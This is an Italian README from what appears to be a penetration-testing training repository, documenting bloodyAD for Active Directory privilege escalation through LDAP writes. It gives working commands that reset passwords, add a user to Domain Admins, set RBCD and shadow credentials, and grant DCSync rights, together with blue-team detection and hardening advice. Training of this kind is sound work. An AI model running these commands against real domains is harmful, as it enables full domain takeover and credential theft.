> [English](README.en.md) | **Italiano**

# bloodyAD - privilege escalation AD via scritture LDAP

> - **Fase:** Privilege Escalation nel dominio - sfruttamento di ACL/diritti scrivibili tramite scritture LDAP dirette
> - **Visibilita:** Media - modifiche LDAP agli oggetti di dominio (gruppi, attributi) tracciabili con la Directory Service auditing (Event ID 5136)
> - **Prerequisiti:** credenziali di dominio (o hash/ticket) con un diritto scrivibile su un oggetto bersaglio (GenericAll, WriteDACL, WriteOwner, ForceChangePassword, AddMember); connettivita LDAP/LDAPS al DC
> - **Tecnica:** `bloodyAD (LDAP write privesc)` | **Severity tipica:** `Alto` | **Finding ID:** da assegnare in lab

- Obiettivo: convertire un diritto scrivibile (individuato con [BloodHound](<../../01-enumeration/bloodhound/README.md>) o [PowerView](<../../01-enumeration/powerview/README.md>)) in controllo effettivo dell'oggetto, usando scritture LDAP dirette senza eseguire codice sul DC.

---

## Executive summary

bloodyAD e un framework Python che esegue le primitive di privilege escalation in Active Directory come
**scritture LDAP dirette**: non richiede una sessione interattiva sul DC, funziona da Linux e supporta
autenticazione con password, hash NTLM (pass-the-hash), ticket Kerberos e certificati. E l'operazionalizzazione
degli abusi di ACL/delega: dove BloodHound dice "hai GenericAll su X", bloodyAD esegue il passo (cambia la
password di X, lo aggiunge a un gruppo, imposta RBCD o shadow credentials, concede diritti di DCSync). Il
risultato e quasi sempre un'escalation (`Alto`/`Critico`).

## Esecuzione / comandi

### Sintassi base e enumerazione delle scritture

```bash
# autenticazione: password, oppure -p ':<NThash>' per pass-the-hash, -k per Kerberos, -c per certificato
export B="bloodyAD --host dc01.lab.local -d lab.local -u lowpriv -p 'Password1'"

$B get writable                              # elenca gli oggetti su cui l'utente puo scrivere (e come)
$B get object "svc_sql" --attr msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Primitive di escalation (per tipo di diritto)

```bash
# ForceChangePassword / GenericAll su un utente -> reset password e impersonazione
$B set password "svc_sql" 'NewPass123!'

# AddMember / GenericAll su un gruppo -> auto-aggiunta a gruppo privilegiato
$B add groupMember "Domain Admins" lowpriv

# GenericAll/GenericWrite su un computer -> RBCD (resource-based constrained delegation)
$B add rbcd "dc01$" "attacker_pc$"          # poi getST -impersonate administrator (vedi rbcd/)

# GenericWrite su un utente/computer -> shadow credentials (msDS-KeyCredentialLink)
$B add shadowCredentials "svc_sql"          # restituisce il certificato per PKINIT -> TGT/NT hash

# WriteDACL sul dominio -> concessione dei diritti di replica (DCSync)
$B add dcsync lowpriv                        # poi secretsdump/dcsync per estrarre i segreti del dominio

# WriteOwner -> presa di proprieta e successiva concessione di GenericAll
$B set owner "svc_sql" lowpriv
$B add genericAll "svc_sql" lowpriv

# MachineAccountQuota > 0 -> creazione di un computer account (utile per RBCD)
$B add computer attacker_pc 'MachinePass123!'
```

Output illustrativo (rappresentativo):

```
$B get writable
distinguishedName: CN=svc_sql,CN=Users,DC=lab,DC=local
permission: WRITE                          <-- diritto scrivibile su svc_sql
$B set password "svc_sql" 'NewPass123!'
[+] Password changed successfully!         <-- controllo dell'account ottenuto
```

## Analisi dei risultati

Ogni primitiva trasforma un diritto in controllo: `set password`/`shadowCredentials` danno accesso all'account;
`add groupMember` da appartenenza privilegiata; `add rbcd`/`add dcsync` aprono la strada a impersonazione e
[DCSync](<../../05-credential-dumping/dcsync/README.md>). La severity e `Alto`, `Critico` quando la catena
termina in DCSync o Domain Admins. Il vantaggio operativo e che tutto avviene via LDAP, senza codice sul DC
(meno rumore EDR lato endpoint).

### Analisi teorica

bloodyAD mostra che in AD l'autorizzazione e governata dalle ACL sugli oggetti della directory: un singolo ACE
mal configurato (GenericAll su un gruppo, WriteDACL sul dominio) e sufficiente a ricostruire un percorso verso
Domain Admin. La difesa non e "patchare una CVE" ma igiene delle ACL: rimuovere i diritti eccessivi, applicare
il modello Tiering e azzerare il MachineAccountQuota.

## Remediation (blue team)

**Rilevamento.** Directory Service Changes (Event ID 5136) su attributi sensibili (`member`,
`msDS-AllowedToActOnBehalfOfOtherIdentity`, `msDS-KeyCredentialLink`, `nTSecurityDescriptor`); creazione di
computer account da utenti non amministrativi (Event ID 4741); reset di password anomali (4724).

**Hardening.** Audit e bonifica delle ACL (rimuovere GenericAll/WriteDACL non necessari); `MachineAccountQuota`
a 0; modello Tiering; protezione degli oggetti privilegiati (AdminSDHolder); monitoraggio di `msDS-KeyCredentialLink`.

---

## Scenario reale: proiezione post-exploitation

> Vale per l'esito "catena di ACL abuse fino a DCSync/Domain Admins" (severity Alto/Critico).

**Red team:** da un utente a basso privilegio con un singolo diritto scrivibile, bloodyAD concatena le primitive
(shadow credentials, poi PKINIT, poi controllo di un account con WriteDACL sul dominio, quindi `add dcsync` e dump
dell'intero NTDS). Il tutto da Linux, via LDAP, senza toccare il filesystem del DC.

**Blue team:** correlare 5136 su `nTSecurityDescriptor`/`member` con l'origine non amministrativa; contenere
revocando i diritti aggiunti e ruotando le credenziali esposte; eradicare bonificando le ACL. Lezione: in AD la
superficie di attacco piu sottovalutata sono i permessi sugli oggetti, non i servizi esposti.

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `bloodyAD` | ad privesc (ldap) | cli - attivo | esecuzione delle primitive di acl/delega abuse via scritture ldap |
| `BloodHound` | graph enum | gui - attivo | individuazione del percorso scrivibile da sfruttare |
| `impacket` (ntlmrelayx, getst, secretsdump) | exploit suite | cli - attivo | completa le catene (relay, rbcd, dcsync) |
| `Certipy` | adcs/pkinit | cli - attivo | usa lo shadow credential (pkinit) per ottenere tgt/nt hash |

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| discovery | account discovery: domain account | `T1087.002` | enumerazione degli oggetti scrivibili (`get writable`). |
| persistence/privesc | account manipulation | `T1098` | modifica di gruppi, acl, rbcd e shadow credentials per l'escalation. |
| persistence | create account: domain account | `T1136.002` | creazione di un computer account (machineaccountquota). |
| credential access | os credential dumping: dcsync | `T1003.006` | concessione dei diritti di replica e successivo dump dei segreti. |

---

## Correlazioni con altri moduli

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [acl-abuse](<../acl-abuse/README.md>) / [bloodhound](<../../01-enumeration/bloodhound/README.md>) | bloodyad | esegue concretamente il diritto scrivibile individuato |
| bloodyad (`add rbcd`) | [rbcd](<../rbcd/README.md>) | imposta l'attributo per la delega e l'impersonazione |
| bloodyad (`add shadowCredentials`) | [shadow-credentials](<../../05-credential-dumping/shadow-credentials/README.md>) | imposta il keycredentiallink per pkinit |
| bloodyad (`add dcsync`) | [dcsync](<../../05-credential-dumping/dcsync/README.md>) | concede i diritti di replica per l'estrazione dei segreti |

---

> **Nota:** Contenuto didattico. I comandi sono funzionanti e vanno eseguiti esclusivamente in laboratori propri o con autorizzazione esplicita. Output illustrativi, non da sistemi reali.
